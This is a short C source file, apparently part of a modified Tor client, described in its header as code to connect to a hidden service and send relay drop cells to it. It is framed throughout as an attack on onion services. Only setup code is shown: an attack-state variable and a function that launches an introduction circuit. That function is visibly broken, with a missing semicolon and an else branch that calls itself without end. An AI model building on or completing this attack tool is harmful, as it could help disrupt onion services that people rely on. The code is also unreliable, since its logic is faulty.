/**
 * \file hs_rd_attack.c
 * \brief contains code to connect to request hidden service and send
 *  relay drop cells to it 
 **/

#include "or.h"
#include "circuituse.h"
#include "rendclient.h"

/* Global variable but not accessible from other files
 * Allow the program the keep a state of the attack 
 * during multiple executions of the attack
 *
 * A little bit sexier than extern variables, still messy
 * but ... Ca casse pas trois pattes a un canard :-)
 */
static hs_rd_attack_t *attack_infos = NULL;

int init_conn_circuit(){
  if (attack_infos){
    attack_infos->state = ATTACK_STATE_CONNECT_TO_INTRO;
    attack_infos->circ = circuit_launch(CIRCUIT_PURPOSE_C_INTRODUCING, CIRCLAUNCH_IS_INTERNAL)
  }
  else {
    return init_conn_circuit(); /* attack_infos not initialized */
  }
  return 0;
}

